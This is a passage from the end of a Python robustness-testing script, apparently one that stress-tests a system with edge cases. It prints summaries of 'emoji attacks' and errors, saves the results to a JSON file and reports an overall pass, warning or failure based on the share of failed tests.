                print(f"  - {attack['issue']}")

        if self.results["emoji_attacks"]:
            print(f"\n😈 EMOJI ATTACKS ({len(self.results['emoji_attacks'])}):")
            for attack in self.results["emoji_attacks"][:3]:
                print(f"  - {attack['text']}")

        if self.results["errors"]:
            print(f"\nFAIL ERRORS ({len(self.results['errors'])}):")
            for error in self.results["errors"][:5]:
                print(f"  - {error['context']}: {error['error']}")

        # Save detailed results
        with open("extended_paranoid_results.json", "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\nDetailed results saved to: extended_paranoid_results.json")

        # Overall assessment
        print("\n" + "=" * 60)
        if failed == 0:
            print("PASS EXTENDED PARANOID TEST: PASSED")
            print("System successfully handles advanced edge cases!")
        elif failed < total * 0.1:  # Less than 10% failures
            print("WARN EXTENDED PARANOID TEST: MOSTLY PASSED")
            print("Minor issues detected - system is reasonably hardened")
        else:
            print("FAIL EXTENDED PARANOID TEST: FAILED")
            print("Significant issues detected - system needs more hardening")


if __name__ == "__main__":
    tester = ExtendedParanoidTester()

    # Run with specific paranoia level (default 10)
    import sys

    level = int(sys.argv[1]) if len(sys.argv) > 1 else 10

    tester.run_all_tests(max_level=level)
